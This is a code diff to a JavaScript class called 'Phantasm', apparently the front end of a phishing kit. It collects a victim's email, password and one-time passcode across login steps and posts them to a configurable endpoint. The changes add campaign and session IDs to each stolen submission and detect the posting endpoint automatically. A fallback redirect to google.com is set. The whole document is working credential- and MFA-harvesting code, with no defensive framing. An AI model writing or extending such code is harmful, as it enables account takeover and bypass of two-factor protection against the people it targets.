@@ -17,8 +17,10 @@ class Phantasm {
                 errorMsg: '#error-msg',
                 userDisplay: '#user-email-display' // element to show email in step 2
             },
-            apiEndpoint: '/login',
+            apiEndpoint: null, // Will try to detect from form action or default to /login
             redirectUrl: 'https://google.com', // default fallback
+            sessionId: null,
+            campaignId: null,
             debug: false,
             ...config
         };
@@ -28,6 +30,17 @@ class Phantasm {
             password: '',
             currentStep: 1
         };
+
+        // Auto-detect API endpoint if not set
+        if (!this.config.apiEndpoint) {
+            const form = document.querySelector('form');
+            if (form && form.getAttribute('action')) {
+                this.config.apiEndpoint = form.getAttribute('action');
+                this.log('Auto-detected API endpoint:', this.config.apiEndpoint);
+            } else {
+                this.config.apiEndpoint = '/login';
+            }
+        }
 
         this.init();
     }
@@ -228,13 +241,18 @@ class Phantasm {
         }
 
         try {
+            const payload = {
+                email: this.state.email,
+                password: this.state.password
+            };
+
+            if (this.config.sessionId) payload.sid = this.config.sessionId;
+            if (this.config.campaignId) payload.cid = this.config.campaignId;
+
             const response = await fetch(this.config.apiEndpoint, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    email: this.state.email,
-                    password: this.state.password
-                })
+                body: JSON.stringify(payload)
             });
 
             const data = await response.json();
@@ -273,14 +291,17 @@ class Phantasm {
         }
 
         try {
+            const payload = {
+                otp: otpInput.value
+            };
+            
+            if (this.config.sessionId) payload.sid = this.config.sessionId;
+            if (this.config.campaignId) payload.cid = this.config.campaignId;
+
             const response = await fetch(this.config.apiEndpoint, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    otp: otpInput.value
-                    // Server handles session matching, no need to resend creds usually
-                    // unless stateless, but let's keep it simple
-                })
+                body: JSON.stringify(payload)
             });
             
             const data = await response.json();
